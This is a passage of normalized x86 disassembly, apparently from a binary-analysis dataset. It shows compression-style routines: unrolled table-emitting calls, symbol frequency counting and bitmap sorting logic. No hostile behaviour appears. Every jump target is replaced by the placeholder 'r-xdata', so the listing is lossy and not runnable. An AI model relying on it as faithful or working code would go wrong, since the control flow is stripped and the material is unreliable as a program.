mov dx [ ecx + eax * 2 + 0x1e ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x20 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x22 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x24 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x26 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x28 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x2a ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x2c ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x2e ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x30 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x32 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x34 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x36 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x38 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x3a ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x3c ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x3e ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x40 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x42 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x44 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x46 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x48 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x4a ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x4c ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x4e ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x50 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x52 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x54 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x56 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x58 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x5a ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x5c ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x5e ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x60 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x62 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x50 ]
add eax 0x1
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x58 ]
add ecx 0x1
mov [ ebp - 0x58 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x58 ]
movzx eax [ edx + 0x680 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x9930 ]
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 ]
mov ecx [ edx + eax * 4 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x58 ]
movzx eax [ edx + 0x680 ]
imul eax eax 0x102
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x9324 ]
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 ]
movzx ecx [ edx + eax ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
jmp r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
sub_410950
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x268 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x8 ] 0x2710
jge r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x22
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
and edx 0x1
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push eax
call sub_410ae0
add esp 0x14
jmp r-xdata
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x4 ] 0x1
jge r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0xffffffff
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x64
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x44 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
cdq
mov ecx 0x3
idiv ecx
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edx
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_411930
add esp 0x1c
cmp [ ebp - 0x20 ] 0x3
jl r-xdata
mov [ ebp - 0x4 ] 0x64
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
cmp [ eax + edx * 4 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
xor ecx ecx
jne r-xdata
mov esp ebp
pop ebp
retn
push 0x3eb
call sub_4057d5
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x1c ] edx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x2
jl r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push eax
call sub_410ae0
add esp 0x14
xor edx edx
jne r-xdata
sub_410ae0
push ebp
mov ebp esp
sub esp 0x834
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x18 ] 0x4
jl r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
xor ecx ecx
jne r-xdata
cmp [ ebp - 0x18 ] 0x101
jge r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp + eax * 4 - 0x420 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0x14 ]
jge r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x18 ]
movzx ecx [ eax ]
mov edx [ ebp + ecx * 4 - 0x420 ]
add edx 0x1
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x18 ]
movzx ecx [ eax ]
mov [ ebp + ecx * 4 - 0x420 ] edx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x100
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + ecx * 4 - 0x420 ]
mov [ ebp + eax * 4 - 0x828 ] edx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x101
jge r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + ecx * 4 - 0x420 ]
mov eax [ ebp - 0x18 ]
add edx [ ebp + eax * 4 - 0x424 ]
mov ecx [ ebp - 0x18 ]
mov [ ebp + ecx * 4 - 0x420 ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
add eax 0x2
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
mov [ ebp - 0x834 ] edx
mov eax [ ebp - 0x834 ]
mov ecx [ ebp + eax * 4 - 0x420 ]
sub ecx 0x1
mov [ ebp - 0x424 ] ecx
mov edx [ ebp - 0x834 ]
mov eax [ ebp - 0x424 ]
mov [ ebp + edx * 4 - 0x420 ] eax
mov ecx [ ebp - 0x424 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x14 ]
jge r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx + eax * 4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x100
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp + eax * 4 - 0x420 ]
sar edx 0x5
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + eax * 4 - 0x420 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
mov ecx [ ebp + 0x10 ]
or eax [ ecx + edx * 4 ]
mov edx [ ebp - 0x18 ]
mov ecx [ ebp + edx * 4 - 0x420 ]
sar ecx 0x5
mov edx [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x20
jge r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] 0x1
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x14 ]
lea eax [ edx + ecx * 2 ]
sar eax 0x5
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x14 ]
lea ecx [ edx + ecx * 2 ]
and ecx 0x1f
mov edx 0x1
shl edx cl
mov ecx [ ebp + 0x10 ]
or edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x14 ]
lea eax [ ecx + eax * 2 ]
sar eax 0x5
mov ecx [ ebp + 0x10 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x14 ]
lea edx [ eax + edx * 2 + 0x1 ]
sar edx 0x5
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x14 ]
lea ecx [ ecx + eax * 2 + 0x1 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
not eax
mov ecx [ ebp + 0x10 ]
and eax [ ecx + edx * 4 ]
mov edx [ ebp - 0x18 ]
mov ecx [ ebp + 0x14 ]
lea edx [ ecx + edx * 2 + 0x1 ]
sar edx 0x5
mov ecx [ ebp + 0x10 ]
mov [ ecx + edx * 4 ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] 0x4
jl r-xdata
cmp [ ebp + 0x18 ] 0x4
jl r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x834 ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
xor eax eax
jne r-xdata
mov [ ebp - 0x834 ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
xor eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0x14 ]
jge r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0x14 ]
jge r-xdata
cmp [ ebp - 0x834 ] 0x100
jl r-xdata
mov eax [ ebp - 0x834 ]
cmp [ ebp + eax * 4 - 0x828 ] 0x0
jne r-xdata
mov [ ebp - 0x830 ] 0x0
mov [ ebp - 0x82c ] 0xffffffff
mov eax [ ebp - 0x18 ]
sar eax 0x5
mov ecx [ ebp - 0x18 ]
and ecx 0x1f
mov edx 0x1
shl edx cl
mov ecx [ ebp + 0x10 ]
and edx [ ecx + eax * 4 ]
je r-xdata
mov esp ebp
pop ebp
retn
push 0x3ed
call sub_4057d5
add esp 0x4
mov edx [ ebp - 0x834 ]
mov eax [ ebp + edx * 4 - 0x828 ]
sub eax 0x1
mov ecx [ ebp - 0x834 ]
mov [ ebp + ecx * 4 - 0x828 ] eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov al [ ebp - 0x834 ]
mov [ edx + ecx ] al
jmp r-xdata
mov ecx [ ebp - 0x834 ]
add ecx 0x1
mov [ ebp - 0x834 ] ecx
jmp r-xdata
cmp [ ebp + 0x18 ] 0x4
jl r-xdata
mov edx [ ebp - 0x82c ]
add edx 0x1
mov [ ebp - 0x424 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x424 ] edx
jns r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x834 ] edx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0xc ]
shl ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0x14 ]
jg r-xdata
xor eax eax
jne r-xdata
mov edx [ ebp - 0x424 ]
sar edx 0x5
mov ecx [ ebp - 0x424 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
mov ecx [ ebp + 0x10 ]
and eax [ ecx + edx * 4 ]
je r-xdata
mov edx [ ebp - 0x424 ]
and edx 0x1f
je r-xdata
mov ecx [ ebp - 0x424 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x834 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
mov eax [ ebp - 0x424 ]
add eax [ ebp + 0x14 ]
